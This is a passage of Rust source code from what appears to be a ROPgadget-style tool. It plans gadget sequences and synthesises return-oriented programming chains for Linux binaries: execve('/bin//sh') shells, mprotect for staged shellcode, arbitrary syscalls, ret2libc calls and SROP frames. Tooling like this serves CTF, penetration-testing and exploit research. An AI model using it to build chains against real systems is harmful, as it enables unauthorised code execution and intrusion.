    }
}

fn is_reg_name(text: &str) -> bool {
    !text.is_empty()
        && text
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
        && text.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
}

/// One gadget of a plan, with the payload words it needs.
struct Step<'g> {
    g: &'g Gadget,
    model: Model,
    /// `slot -> (value, kind, comment)`.
    fills: Vec<(usize, u64, WordKind, String)>,
}

/// Emit a planned sequence, filling each gadget's payload slots with the
/// planned value, the already-set value of the register that slot lands in,
/// or the padding constant.
fn emit(b: &mut ChainBuilder, steps: &[Step], already: &[(String, u64)]) {
    for step in steps {
        b.gadget(step.g);
        for slot in 0..step.model.slots {
            if let Some((_, v, kind, comment)) = step.fills.iter().find(|(i, ..)| *i == slot) {
                b.word(*v, *kind, comment.clone());
                continue;
            }
            match step.model.slot_regs.get(slot).and_then(|r| r.as_deref()) {
                Some(reg) => match already.iter().find(|(r, _)| r.eq_ignore_ascii_case(reg)) {
                    Some((_, v)) => b.word(
                        *v,
                        WordKind::Padding,
                        format!("padding without overwrite {reg}"),
                    ),
                    None => b.pad(),
                },
                None => b.pad(),
            }
        }
    }
}

/// Plan a way to put `value` into `reg` without destroying anything in
/// `keep` (`CHLX-01`).
///
/// Strategy order, cheapest first:
///   1. **a payload slot** — any gadget whose model puts `reg` at a slot the
///      chain can fill.  This is where `pop rbx ; pop rdx ; ret`,
///      `pop rdx ; repz ret` and `popal ; cld ; ret` come in, none of which
///      the leading-instruction rule could see.
///   2. **a folded zero** — `xor reg, reg`, when `value` is 0.  Preferred
///      over a popped 0 because it costs no payload word, and required when
///      `0x00` is a bad byte.
///   3. **a register transfer** — pop an intermediate register, then
///      `mov reg, tmp`.  The Windows builder has had this since Phase 4b;
///      the Linux one never did.
fn plan_set_reg<'a>(
    ctx: &Ctx<'a>,
    reg: &str,
    value: u64,
    keep: &[(String, u64)],
    comment: &str,
    kind: WordKind,
) -> Option<Vec<Step<'a>>> {
    if value == 0 {
        if let Some(step) = zero_step(ctx, reg, keep) {
            return Some(vec![step]);
        }
    }
    if let Some(step) = pop_step(ctx, reg, value, keep, comment, kind) {
        return Some(vec![step]);
    }
    transfer_steps(ctx, reg, value, keep, comment, kind)
}

/// Strategy 1: `reg` comes off the payload.
fn pop_step<'a>(
    ctx: &Ctx<'a>,
    reg: &str,
    value: u64,
    keep: &[(String, u64)],
    comment: &str,
    kind: WordKind,
) -> Option<Step<'a>> {
    if !value_ok(value, ctx.word, ctx.badbytes) {
        return None;
    }
    // ROPgadget reverses the list "to find the smaller gadget"; the planner
    // makes that explicit — fewest payload words wins, ties broken by the
    // oracle's reversed order.
    let (a, m, slot) = ctx
        .anas
        .iter()
        .filter_map(|a| {
            let m = a.model.as_ref()?;
            let slot = m.slot_of(reg)?;
            (m.write.is_none() && m.preserves(keep)).then_some((a, m, slot))
        })
        .min_by_key(|(_, m, _)| (m.slots, m.clobbers.len(), m.zeroes.len() + m.moves.len()))?;
    Some(Step {
        g: a.g,
        model: m.clone(),
        fills: vec![(slot, value, kind, comment.to_string())],
    })
}

/// Strategy 2: a gadget that forces `reg` to zero.
fn zero_step<'a>(ctx: &Ctx<'a>, reg: &str, keep: &[(String, u64)]) -> Option<Step<'a>> {
    let (a, m) = ctx
        .anas
        .iter()
        .filter_map(|a| {
            let m = a.model.as_ref()?;
            (m.zeroes_reg(reg) && m.write.is_none() && m.preserves(keep)).then_some((a, m))
        })
        .min_by_key(|(_, m)| (m.slots, m.clobbers.len(), m.zeroes.len() + m.moves.len()))?;
    Some(Step {
        g: a.g,
        model: m.clone(),
        fills: Vec::new(),
    })
}

/// Strategy 3: `pop tmp` then `mov reg, tmp`.
fn transfer_steps<'a>(
    ctx: &Ctx<'a>,
    reg: &str,
    value: u64,
    keep: &[(String, u64)],
    comment: &str,
    kind: WordKind,
) -> Option<Vec<Step<'a>>> {
    for a in ctx.anas {
        let Some(m) = a.model.as_ref() else { continue };
        if m.write.is_some() || !m.preserves(keep) {
            continue;
        }
        for (dst, src, width) in &m.moves {
            if !dst.eq_ignore_ascii_case(reg) || src.eq_ignore_ascii_case(reg) {
                continue;
            }
            // A narrow move zero-extends: `mov edx, eax` only carries 32
            // bits of the value.
            if let Some(w) = width {
                if *w < ctx.word && value >= (1u64 << (w * 8)) {
                    continue;
                }
            }
            // The move must not eat the value it is about to copy: the
            // gadget may not pop, zero, transfer into or otherwise write the
            // SOURCE register, or the value the previous step loaded there
            // is not the value that arrives in `reg`.  `xor ecx, ecx ;
            // add r11, rcx ; mov rax, r11 ; ret` reports `mov rax, r11` as a
            // transfer, but r11 is read-modify-written first.
            if m.slot_of(src).is_some()
                || m.clobbers_reg(src)
                || m.zeroes_reg(src)
                || m.moves.iter().any(|(d, _, _)| d.eq_ignore_ascii_case(src))
            {
                continue;
            }
            let Some(load) = pop_step(ctx, src, value, keep, comment, kind) else {
                continue;
            };
            // The loading gadget must not itself be the move gadget, and the
            // move must survive whatever the load clobbers.
            if load.g.vaddr == a.g.vaddr {
                continue;
            }
            return Some(vec![
                load,
                Step {
                    g: a.g,
                    model: m.clone(),
                    fills: Vec::new(),
                },
            ]);
        }
    }
    None
}

/// A chosen write-what-where primitive and the plans that drive it.
pub(crate) struct Writer<'a> {
    pub(crate) g: &'a Gadget,
    model: Model,
    write: MemWrite,
}

/// Step 1's backtracking candidates (ropmakerx64.py:154-168), generalised:
/// every write-what-where gadget the model can drive, in the oracle's
/// reversed ("smaller gadget first") order.
///
/// The oracle rejected a candidate up front when its dst/src had no leading
/// `pop` and its src no leading `xor`.  The planner cannot decide that in
/// advance — a register may be reachable by transfer, by a later `pop` slot,
/// or only for some values under `--badbytes` — so the caller instead tries
/// to build the whole chain with each candidate in turn and keeps the first
/// that completes.
pub(crate) fn writer_candidates<'a>(ctx: &Ctx<'a>, regs: &[&str]) -> Vec<Writer<'a>> {
    /// Bound on how many write-what-where primitives the builder backtracks
    /// over; on a 45k-gadget binary the useful ones are all near the front of
    /// the reversed list.
    const MAX_WRITERS: usize = 32;

    let mut out = Vec::new();
    for a in ctx.anas {
        let Some(m) = a.model.as_ref() else { continue };
        let Some(w) = m.write.as_ref() else { continue };
        if !regs.contains(&w.base.as_str()) || !regs.contains(&w.src.as_str()) {
            continue;
        }
        if w.base.eq_ignore_ascii_case(&w.src) {
            continue;
        }
        out.push(Writer {
            g: a.g,
            model: m.clone(),
            write: w.clone(),
        });
        if out.len() >= MAX_WRITERS {
            break;
        }
    }
    // "To find the smaller gadget", made explicit: the primitive that costs
    // the fewest payload words wins, then the one that needs no displacement
    // arithmetic, then the oracle's reversed order.  Ordering matters a lot
    // here — elf-Linux-x86's first candidate in raw reversed order is
    // `mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret`, which costs
    // seven payload words per write and defeats static stack accounting.
    out.sort_by_key(|w| (w.model.slots, w.model.clobbers.len(), w.write.disp != 0));
    out
}

/// Emit `[addr] <- value` with the chosen primitive.
#[allow(clippy::too_many_arguments)]
pub(crate) fn emit_write(
    b: &mut ChainBuilder,
    ctx: &Ctx<'_>,
    w: &Writer<'_>,
    addr: u64,
    addr_comment: &str,
    value: u64,
    value_kind: WordKind,
    value_comment: &str,
    already: &[(String, u64)],
) -> Result<(), ChainError> {
    let ptr = addr.wrapping_sub(w.write.disp as u64);
    let missing =
        |r: &str| ChainError::MissingGadget(format!("cannot set {r} to write at {addr:#x}"));
    // The pointer register does not hold the write address when the store is
    // displaced, so say what it does hold.
    let ptr_comment = match w.write.disp {
        0 => addr_comment.to_string(),
        d if d > 0 => format!("{addr_comment} - {d:#x}"),
        d => format!("{addr_comment} + {:#x}", -d),
    };

    // Which register to load first is not free: on elf-FreeBSD-x86 the only
    // `pop edx` gadget also does `mov eax, ecx`, so loading the pointer
    // (eax) first destroys it — while loading edx first and eax second
    // works.  Try both orders before giving up.
    let base = (w.write.base.clone(), ptr, ptr_comment, WordKind::DataAddr);
    let src = (
        w.write.src.clone(),
        value,
        value_comment.to_string(),
        value_kind,
    );
    let mut plans = None;
    for [first, second] in [[&base, &src], [&src, &base]] {
        let mut keep = already.to_vec();
        let Some(p1) = plan_set_reg(ctx, &first.0, first.1, &keep, &first.2, first.3) else {
            continue;
        };
        keep.push((first.0.clone(), first.1));
        let Some(p2) = plan_set_reg(ctx, &second.0, second.1, &keep, &second.2, second.3) else {
            continue;
        };
        plans = Some((p1, p2, first.0.clone(), first.1));
        break;
    }
    let Some((p1, p2, first_reg, first_val)) = plans else {
        return Err(missing(&w.write.base));
    };

    let mut keep = already.to_vec();
    emit(b, &p1, &keep);
    keep.push((first_reg, first_val));
    emit(b, &p2, &keep);
    keep.push((w.write.base.clone(), ptr));
    keep.push((w.write.src.clone(), value));

    if !w.model.preserves(already) {
        return Err(ChainError::MissingGadget(format!(
            "write-what-where gadget `{}` destroys chain state",
            w.g.text()
        )));
    }
    emit(
        b,
        &[Step {
            g: w.g,
            model: w.model.clone(),
            fills: Vec::new(),
        }],
        &keep,
    );
    Ok(())
}

/// Set the syscall number (`CHLX-02`).
///
/// The oracle emits `xor rax, rax` plus fifty-nine `add rax, 1` gadgets — 60
/// words to reach 59 — even on a binary that also holds `pop rax ; ret`.
/// Ask the planner first; keep the increment ladder only as the fallback it
/// always should have been.
fn emit_syscall_number(
    b: &mut ChainBuilder,
    ctx: &Ctx<'_>,
    reg: &str,
    number: u64,
    comment: &str,
    already: &[(String, u64)],
) -> Result<(), ChainError> {
    if let Some(plan) = plan_set_reg(ctx, reg, number, already, comment, WordKind::DataAddr) {
        emit(b, &plan, already);
        return Ok(());
    }

    // Fallback: the oracle's construction, with the padding now protecting
    // every register the chain has already set rather than the two the
    // oracle happened to list.
    let rev = ctx.rev();
    let zero = format!("xor {reg}, {reg}");
    let xor = find_exact(&rev, &zero)
        .ok_or_else(|| ChainError::MissingGadget(format!("{zero} (and no `pop {reg}`)")))?;
    let inc_forms: Vec<String> = if reg == "rax" {
        [
            "inc rax",
            "inc eax",
            "inc al",
            "add rax, 1",
            "add eax, 1",
            "add al, 1",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    } else {
        vec!["inc eax".to_string(), "add eax, 1".to_string()]
    };
    let inc = inc_forms
        .iter()
        .find_map(|s| find_exact(&rev, s))
        .ok_or_else(|| ChainError::MissingGadget(format!("inc {reg} / add {reg}, 1")))?;

    let borrowed: Vec<(&str, u64)> = already.iter().map(|(r, v)| (r.as_str(), *v)).collect();
    b.gadget(xor);
    b.padding(xor, &borrowed);
    for _ in 0..number {
        b.gadget(inc);
        b.padding(inc, &borrowed);
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// ECO-04 / CHLX-07: goal-directed synthesis
//
// Everything above this line is the execve recipe generalised once already
// (CHLX-01 replaced its literal gadget lookups with the planner). What
// follows removes the last hardcoded part: the GOAL. A goal is a set of
// postconditions -- memory words that must hold a value, registers that must
// hold a value when control leaves the chain -- plus how control leaves. The
// synthesizer backtracks over write-what-where primitives and over the order
// the registers are populated in, asking `plan_set_reg` (v0.4's constraint
// layer over v0.3's clobber/transfer data) for each one.
//
// `linux-execve` is now one Goal among several rather than the only shape
// the module can express, and adding `mprotect`, a generic `--syscall <n>`,
// `ret2libc` and SROP costs a `Goal` constructor each.
// ---------------------------------------------------------------------------

/// The Linux chain targets. `--chain <name>` on the CLI, `target` on MCP.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum LinuxTarget {
    /// `execve("/bin//sh", NULL, NULL)`.
    #[default]
    Execve,
    /// `mprotect(page, len, prot)` -- the NX answer, and the staging half of
    /// a staged-shellcode exploit.
    Mprotect,
    /// Any syscall: `--syscall <n> --syscall-args rdi=..,rsi=..`.
    Syscall,
    /// `func(arg)` with the argument in the ABI's first register (x64) or
    /// on the stack (x86 cdecl) -- pwntools' `rop.call(system, [binsh])`.
    Ret2Libc,
    /// Sigreturn-oriented programming: two gadgets plus a frame that sets
    /// EVERY register, for binaries too gadget-poor for the direct route.
    Srop,
}

impl LinuxTarget {
    /// Every accepted `--chain` spelling, in help order.
    pub const NAMES: &'static [&'static str] = &[
        "linux-execve",
        "linux-mprotect",
        "linux-syscall",
        "linux-ret2libc",
        "linux-srop",
    ];

    /// Parse a `--chain` value; `None` for anything not in [`Self::NAMES`].
    pub fn parse(s: &str) -> Option<LinuxTarget> {
        Some(match s {
            "linux-execve" => LinuxTarget::Execve,
            "linux-mprotect" => LinuxTarget::Mprotect,
            "linux-syscall" => LinuxTarget::Syscall,
            "linux-ret2libc" => LinuxTarget::Ret2Libc,
            "linux-srop" => LinuxTarget::Srop,
            _ => return None,
        })
    }

    /// The `--chain` spelling of this target.
    pub fn as_str(self) -> &'static str {
        match self {
            LinuxTarget::Execve => "linux-execve",
            LinuxTarget::Mprotect => "linux-mprotect",
            LinuxTarget::Syscall => "linux-syscall",
            LinuxTarget::Ret2Libc => "linux-ret2libc",
            LinuxTarget::Srop => "linux-srop",
        }
    }

    /// Does this target need a write-what-where primitive?
    pub fn needs_write_primitive(self) -> bool {
        matches!(
            self,
            LinuxTarget::Execve | LinuxTarget::Ret2Libc | LinuxTarget::Srop
        )
    }
}

/// `mprotect`'s default `prot`: `PROT_READ | PROT_WRITE | PROT_EXEC`.
pub const DEFAULT_LINUX_PROT: u64 = 7;
/// `mprotect`'s default length: one page.
pub const DEFAULT_LINUX_LEN: u64 = 0x1000;

/// Everything the Linux builders take beyond the scan itself.
///
/// Every field has a default that reproduces the v0.4 `linux-execve`
/// behaviour, so `LinuxChainOpts::default()` is the old builder.
#[derive(Debug, Clone)]
pub struct LinuxChainOpts {
    /// Which Linux chain to build.
    pub target: LinuxTarget,
    /// `--syscall <n>`: the syscall number for `linux-syscall`, and the
    /// number the SROP frame is built around. `None` = the target's own.
    pub syscall_nr: Option<u64>,
    /// `--syscall-args rdi=0x1000,rsi=8`: argument registers and values.
    pub syscall_args: Vec<(String, u64)>,
    /// `--api-addr`: the runtime address of the function `linux-ret2libc`
    /// calls (`system`, an `mprotect` PLT stub, ...).
    pub func_addr: Option<u64>,
    /// `--shellcode-addr`: the region `linux-mprotect` makes executable.
    /// `None` = the chain's own writable window.
    pub shellcode_addr: Option<u64>,
    /// `--shellcode-size`: that region's length.
    pub shellcode_size: u64,
    /// `--prot`: `mprotect`'s third argument. 7 = PROT_READ|WRITE|EXEC.
    pub prot: u64,
}

impl Default for LinuxChainOpts {
    fn default() -> Self {
        LinuxChainOpts {
            target: LinuxTarget::Execve,
            syscall_nr: None,
            syscall_args: Vec::new(),
            func_addr: None,
            shellcode_addr: None,
            shellcode_size: DEFAULT_LINUX_LEN,
            prot: DEFAULT_LINUX_PROT,
        }
    }
}

/// The syscall ABI and the write-what-where register set of one ISA.
pub(crate) struct Abi {
    pub(crate) word: usize,
    regs: &'static [&'static str],
    missing_w4w: &'static str,
    pub(crate) trap: &'static str,
    pub(crate) nr_reg: &'static str,
    /// Argument registers in syscall order.
    pub(crate) args: &'static [&'static str],
    nr_execve: u64,
    nr_mprotect: u64,
}

const ABI64: Abi = Abi {
    word: 8,
    regs: REGS64,
    missing_w4w: "mov qword ptr [r64], r64",
    trap: "syscall",
    nr_reg: "rax",
    args: &["rdi", "rsi", "rdx", "r10", "r8", "r9"],
    nr_execve: 59,
    nr_mprotect: 10,
};

const ABI32: Abi = Abi {
    word: 4,
    regs: REGS32,
    missing_w4w: "mov dword ptr [r32], r32",
    trap: "int 0x80",
    nr_reg: "eax",
    args: &["ebx", "ecx", "edx", "esi", "edi"],
    nr_execve: 11,
    nr_mprotect: 125,
};

pub(crate) fn abi_of(arch: Arch) -> &'static Abi {
    if arch == Arch::X64 {
        &ABI64
    } else {
        &ABI32
    }
}

/// A memory postcondition: `[addr] == value` when the chain leaves.
#[derive(Debug, Clone)]
struct MemPost {
    addr: u64,
    addr_comment: String,
    value: u64,
    kind: WordKind,
    value_comment: String,
}

/// A register postcondition: `reg == value` when the chain leaves.
#[derive(Debug, Clone)]
struct RegPost {
    reg: String,
    value: u64,
    kind: WordKind,
    comment: String,
    /// `CHLX-02`: when the planner cannot reach this register, fall back to
    /// the oracle's `xor reg, reg` + N x `inc reg` ladder. True only for a
    /// syscall NUMBER, where a small constant makes the ladder tractable;
    /// an address argument would need billions of increments.
    ladder: bool,
}

/// How control leaves the chain.
#[derive(Debug, Clone)]
enum Exit {
    /// `syscall` / `int 0x80`.
    Trap,
    /// A `ret` into an address that is not a gadget of this binary: a libc
    /// entry, staged shellcode. `stack_args` are cdecl arguments pushed
    /// after the fake return address (x86 only; x64 passes in registers).
    Code {
        addr: u64,
        comment: String,
        stack_args: Vec<(u64, WordKind, String)>,
    },
    /// `rt_sigreturn` plus the frame the kernel restores from.
    Sigreturn { frame: Vec<(u64, WordKind, String)> },
}

/// A goal in postcondition form. This is the whole interface between "what
/// the user asked for" and "which gadgets get chosen".
#[derive(Debug, Clone)]
struct Goal {
    description: String,
    script_comment: String,
    mem: Vec<MemPost>,
    regs: Vec<RegPost>,
    exit: Exit,
}

/// The register-population orders the synthesizer backtracks over.
///
/// Order matters because a gadget that sets one register may clobber
/// another: `plan_set_reg` refuses to destroy anything already in `keep`,
/// so a register whose only route is a wide gadget has to go FIRST. The
/// full permutation set is `n!`; the bound here is `n + 1` orders -- the
/// declared order, its reverse, and each register hoisted to the front --
/// which is what actually resolves the collisions the fixtures produce and
/// keeps a six-argument `--syscall` from costing 720 build attempts.
fn candidate_orders(n: usize) -> Vec<Vec<usize>> {
    if n <= 1 {
        return vec![(0..n).collect()];
    }
    let ident: Vec<usize> = (0..n).collect();
    let mut out = vec![ident.clone()];
    let mut rev = ident.clone();
    rev.reverse();
    if !out.contains(&rev) {
        out.push(rev);
    }
    for i in 1..n {
        let mut o = vec![i];
        o.extend(ident.iter().copied().filter(|&j| j != i));
        if !out.contains(&o) {
            out.push(o);
        }
    }
    out
}

/// Emit `goal` with `writer` as the write-what-where primitive.
///
/// Returns a fresh builder so a failed attempt costs nothing -- backtracking
/// over writers and over register orders is what makes the search a search.
fn synthesize_with(
    ctx: &Ctx<'_>,
    goal: &Goal,
    writer: Option<&Writer<'_>>,
    trap: Option<&Gadget>,
    pad: u64,
) -> Result<ChainBuilder, ChainError> {
    let mut b = ChainBuilder::new(pad);
    for post in &goal.mem {
        let w = writer
            .ok_or_else(|| ChainError::MissingGadget("write-what-where primitive".to_string()))?;
        emit_write(
            &mut b,
            ctx,
            w,
            post.addr,
            &post.addr_comment,
            post.value,
            post.kind,
            &post.value_comment,
            &[],
        )?;
    }

    // Register postconditions, backtracking over the order.
    let mut last: Option<ChainError> = None;
    let mut done = false;
    let base = (b.words.clone(), b.gadgets.clone(), b.gmap.clone());
    for order in candidate_orders(goal.regs.len()) {
        let mut scratch = ChainBuilder::new(pad);
        scratch.words = base.0.clone();
        scratch.gadgets = base.1.clone();
        scratch.gmap = base.2.clone();
        let mut already: Vec<(String, u64)> = Vec::new();
        let mut ok = true;
        for &i in &order {
            let p = &goal.regs[i];
            match plan_set_reg(ctx, &p.reg, p.value, &already, &p.comment, p.kind) {
                Some(plan) => emit(&mut scratch, &plan, &already),
                None if p.ladder => {
                    if let Err(e) = emit_syscall_number(
                        &mut scratch,
                        ctx,
                        &p.reg,
                        p.value,
                        &p.comment,
                        &already,
                    ) {
                        last = Some(e);
                        ok = false;
                        break;
                    }
                }
                None => {
                    last = Some(ChainError::MissingGadget(format!(
                        "cannot set {} to {:#x} ({})",
                        p.reg, p.value, p.comment
                    )));
                    ok = false;
                    break;
                }
            }
            already.push((p.reg.clone(), p.value));
        }
        if ok {
            b.words = scratch.words;
            b.gadgets = scratch.gadgets;
            b.gmap = scratch.gmap;
            done = true;
            break;
        }
    }
    if !done {
        return Err(last
            .unwrap_or_else(|| ChainError::MissingGadget("register postconditions".to_string())));
    }

    match &goal.exit {
        Exit::Trap | Exit::Sigreturn { .. } => {
            let trap = trap.ok_or_else(|| ChainError::MissingGadget("syscall trap".to_string()))?;
            b.gadget(trap);
        }
        Exit::Code {
            addr,
            comment,
            stack_args,
        } => {
            b.words.push(ChainWord {
                value: *addr,
                kind: WordKind::CodeAddr,
                comment: comment.clone(),
                source_gadget: None,
            });
            // The called function's own `ret` consumes the next word. It is
            // not a gadget of this binary and the chain does not continue
            // through it, so it is a callee frame, not a chain word.
            b.words.push(ChainWord {
                value: pad,
                kind: WordKind::Padding,
                comment: "return address of the called function (callee frame)".to_string(),
                source_gadget: None,
            });
            for (value, kind, comment) in stack_args {
                b.words.push(ChainWord {
                    value: *value,
                    kind: *kind,
                    comment: comment.clone(),
                    source_gadget: None,
                });
            }
        }
    }
    if let Exit::Sigreturn { frame } = &goal.exit {
        for (value, kind, comment) in frame {
            b.words.push(ChainWord {
                value: *value,
                kind: *kind,
                comment: comment.clone(),
                source_gadget: None,
            });
        }
    }
    Ok(b)
}

/// Synthesize `goal`, backtracking over write-what-where primitives.
fn synthesize(ctx: &Ctx<'_>, abi: &Abi, goal: &Goal, pad: u64) -> Result<ChainBuilder, ChainError> {
    let rev = ctx.rev();
    // The write-what-where primitive is looked up FIRST because it is the
    // scarcest requirement and therefore the most useful thing to name when
    // a binary cannot host the chain at all.
    let candidates = if goal.mem.is_empty() {
        Vec::new()
    } else {
        let c = writer_candidates(ctx, abi.regs);
        if c.is_empty() {
            return Err(ChainError::MissingGadget(abi.missing_w4w.to_string()));
        }
        c
    };
    let trap = match goal.exit {
        Exit::Code { .. } => None,
        _ => Some(
            find_exact(&rev, abi.trap)
                .ok_or_else(|| ChainError::MissingGadget(abi.trap.to_string()))?,
        ),
    };
    if goal.mem.is_empty() {
        return synthesize_with(ctx, goal, None, trap, pad);
    }
    let mut last: Option<ChainError> = None;
    for w in &candidates {
        match synthesize_with(ctx, goal, Some(w), trap, pad) {
            Ok(b) => return Ok(b),
            Err(e) => last = Some(e),
        }
    }
    Err(last.unwrap_or_else(|| ChainError::MissingGadget(abi.missing_w4w.to_string())))
}

/// The "/bin//sh" path writes, and the NULL that terminates argv/envp.
fn path_writes(data: u64, word: usize) -> Vec<MemPost> {
    let mut out = Vec::new();
    if word == 8 {
        out.push(MemPost {
            addr: data,
            addr_comment: "@ .data".to_string(),
            value: u64::from_le_bytes(*b"/bin//sh"),
            kind: WordKind::Immediate,
            value_comment: "\"/bin//sh\"".to_string(),
        });
    } else {
        out.push(MemPost {
            addr: data,
            addr_comment: "@ .data".to_string(),
            value: u32::from_le_bytes(*b"/bin") as u64,
            kind: WordKind::Immediate,
            value_comment: "\"/bin\"".to_string(),
        });
        out.push(MemPost {
            addr: data + 4,
            addr_comment: "@ .data + 4".to_string(),
            value: u32::from_le_bytes(*b"//sh") as u64,
            kind: WordKind::Immediate,
            value_comment: "\"//sh\"".to_string(),
        });
    }
    out.push(MemPost {
        addr: data + 8,
        addr_comment: "@ .data + 8".to_string(),
        value: 0,
        kind: WordKind::DataAddr,
        value_comment: "NULL".to_string(),
    });
    out
}

/// amd64 `rt_sigreturn` frame layout, in words from the word that follows
/// the `syscall` gadget's address. Matches the kernel's `struct rt_sigframe`
/// (`arch/x86/include/uapi/asm/sigcontext.h`) and pwntools'
/// `SigreturnFrame('amd64')` word for word.
const SROP64_WORDS: usize = 31;
const SROP64_R8: usize = 5;
const SROP64_R9: usize = 6;
const SROP64_R10: usize = 7;
const SROP64_RDI: usize = 13;
const SROP64_RSI: usize = 14;
const SROP64_RDX: usize = 17;
const SROP64_RAX: usize = 18;
const SROP64_RSP: usize = 20;
const SROP64_RIP: usize = 21;
const SROP64_CSGSFS: usize = 23;
/// `cs = 0x33`, `gs = fs = 0`: 64-bit user mode.
const SROP64_CSGSFS_VALUE: u64 = 0x33;
/// `__NR_rt_sigreturn` on x86-64.
const NR_RT_SIGRETURN64: u64 = 15;

/// Build the sigreturn frame the kernel restores, so that on return the
/// process runs `nr(args...)` at `rip` with `rsp`.
fn srop64_frame(
    nr: u64,
    args: &[(String, u64)],
    rip: u64,
    rsp: u64,
) -> Vec<(u64, WordKind, String)> {
    let mut frame: Vec<(u64, WordKind, String)> = (0..SROP64_WORDS)
        .map(|_| (0u64, WordKind::DataAddr, "sigcontext (zero)".to_string()))
        .collect();
    let mut set = |i: usize, v: u64, what: &str| {
        frame[i] = (v, WordKind::DataAddr, format!("sigcontext.{what}"));
    };
    for (reg, value) in args {
        let slot = match reg.as_str() {
            "rdi" => SROP64_RDI,
            "rsi" => SROP64_RSI,
            "rdx" => SROP64_RDX,
            "r10" => SROP64_R10,
            "r8" => SROP64_R8,
            "r9" => SROP64_R9,
            _ => continue,
        };
        set(slot, *value, reg);
    }
    set(SROP64_RAX, nr, "rax (syscall number)");
    set(SROP64_RSP, rsp, "rsp");
    set(SROP64_RIP, rip, "rip (the syscall gadget)");
    set(SROP64_CSGSFS, SROP64_CSGSFS_VALUE, "csgsfs (cs = 0x33)");
    frame
}

/// Turn `opts` into the postcondition set for one write-target address.
///
/// This is the whole "recipe" surface that is left: every target is a few
/// lines of postconditions, and none of them names a gadget.
fn goal_for(
    abi: &Abi,
    arch: Arch,
    opts: &LinuxChainOpts,
    data: u64,
    stack_hint: u64,
    trap_vaddr: u64,
) -> Result<Goal, ChainError> {
    let dk = WordKind::DataAddr;
    let argreg = |i: usize| abi.args[i].to_string();
    match opts.target {
        LinuxTarget::Execve => Ok(Goal {
            description: format!(
                "Linux execve(\"/bin//sh\", NULL, NULL) via {}",
                if abi.word == 8 { "syscall" } else { "int 0x80" }
            ),
            // Verbatim ROPgadget header -- byte-parity with the oracle
            // depends on this exact comment line.
            script_comment: "# execve generated by ROPgadget".to_string(),
            mem: path_writes(data, abi.word),
            regs: vec![
                RegPost {
                    reg: argreg(0),
                    value: data,
                    kind: dk,
                    comment: "@ .data".to_string(),
                    ladder: false,
                },
                RegPost {
                    reg: argreg(1),
                    value: data + 8,
                    kind: dk,
                    comment: "@ .data + 8".to_string(),
                    ladder: false,
                },
                RegPost {
                    reg: argreg(2),
                    value: data + 8,
                    kind: dk,
                    comment: "@ .data + 8".to_string(),
                    ladder: false,
                },
                RegPost {
                    reg: abi.nr_reg.to_string(),
                    value: abi.nr_execve,
                    kind: dk,
                    comment: format!("{} = {} (__NR_execve)", abi.nr_reg, abi.nr_execve),
                    ladder: true,
                },
            ],
            exit: Exit::Trap,
        }),
        LinuxTarget::Mprotect => {
            let region = opts.shellcode_addr.unwrap_or(data);
            let page = region & !(PAGE_SIZE - 1);
            let len = (region - page + opts.shellcode_size.max(1)).div_ceil(PAGE_SIZE) * PAGE_SIZE;
            Ok(Goal {
                description: format!(
                    "Linux mprotect({page:#x}, {len:#x}, {}) -- makes the staged-shellcode \
                     region executable; the chain ends at the trap because this scanner's \
                     syscall table never emits a `{} ; ret` gadget to return through",
                    prot_label(opts.prot),
                    abi.trap
                ),
                script_comment: "# mprotect chain (rop-finder)".to_string(),
                mem: Vec::new(),
                regs: vec![
                    RegPost {
                        reg: argreg(0),
                        value: page,
                        kind: dk,
                        comment: format!("arg1 addr (page-aligned) {page:#x}"),
                        ladder: false,
                    },
                    RegPost {
                        reg: argreg(1),
                        value: len,
                        kind: dk,
                        comment: format!("arg2 len {len:#x}"),
                        ladder: false,
                    },
                    RegPost {
                        reg: argreg(2),
                        value: opts.prot,
                        kind: dk,
                        comment: format!("arg3 prot {}", prot_label(opts.prot)),
                        ladder: false,
                    },
                    RegPost {
                        reg: abi.nr_reg.to_string(),
                        value: abi.nr_mprotect,
                        kind: dk,
                        comment: format!("{} = {} (__NR_mprotect)", abi.nr_reg, abi.nr_mprotect),
                        ladder: true,
                    },
                ],
                exit: Exit::Trap,
            })
        }
        LinuxTarget::Syscall => {
            let nr = opts.syscall_nr.ok_or_else(|| {
                ChainError::MissingGadget(
                    "linux-syscall needs --syscall <n> (the syscall number to invoke)".to_string(),
                )
            })?;
            let mut regs = Vec::new();
            for (reg, value) in &opts.syscall_args {
                regs.push(RegPost {
                    reg: reg.clone(),
                    value: *value,
                    kind: dk,
                    comment: format!("{reg} = {value:#x}"),
                    ladder: false,
                });
            }
            regs.push(RegPost {
                reg: abi.nr_reg.to_string(),
                value: nr,
                kind: dk,
                comment: format!("{} = {nr} (syscall number)", abi.nr_reg),
                ladder: true,
            });
            let arglist = opts
                .syscall_args
                .iter()
                .map(|(r, v)| format!("{r}={v:#x}"))
                .collect::<Vec<_>>()
                .join(", ");
            Ok(Goal {
                description: format!("Linux syscall {nr} ({arglist}) via {}", abi.trap),
                script_comment: format!("# syscall {nr} chain (rop-finder)"),
                mem: Vec::new(),
                regs,
                exit: Exit::Trap,
            })
        }
        LinuxTarget::Ret2Libc => {
            let func = opts.func_addr.ok_or_else(|| {
                ChainError::MissingGadget(
                    "linux-ret2libc needs --api-addr <runtime address of the function to call> \
                     (e.g. libc's `system`); this builder does not resolve libc symbols"
                        .to_string(),
                )
            })?;
            let call = Exit::Code {
                addr: func,
                comment: format!("call {func:#x} (--api-addr) with \"/bin//sh\""),
                stack_args: if abi.word == 4 {
                    // cdecl: the argument is on the stack, after the fake
                    // return address. x86 needs no gadget at all for this.
                    vec![(data, dk, "arg1 @ .data (\"/bin//sh\")".to_string())]
                } else {
                    Vec::new()
                },
            };
            Ok(Goal {
                description: format!(
                    "Linux ret2libc: {func:#x}(\"/bin//sh\" @ {data:#x}){}",
                    if abi.word == 8 {
                        " (SysV: arg1 in rdi)"
                    } else {
                        " (cdecl: arg1 on the stack)"
                    }
                ),
                script_comment: "# ret2libc chain (rop-finder)".to_string(),
                mem: path_writes(data, abi.word),
                regs: if abi.word == 8 {
                    vec![RegPost {
                        reg: argreg(0),
                        value: data,
                        kind: dk,
                        comment: "arg1 @ .data (\"/bin//sh\")".to_string(),
                        ladder: false,
                    }]
                } else {
                    Vec::new()
                },
                exit: call,
            })
        }
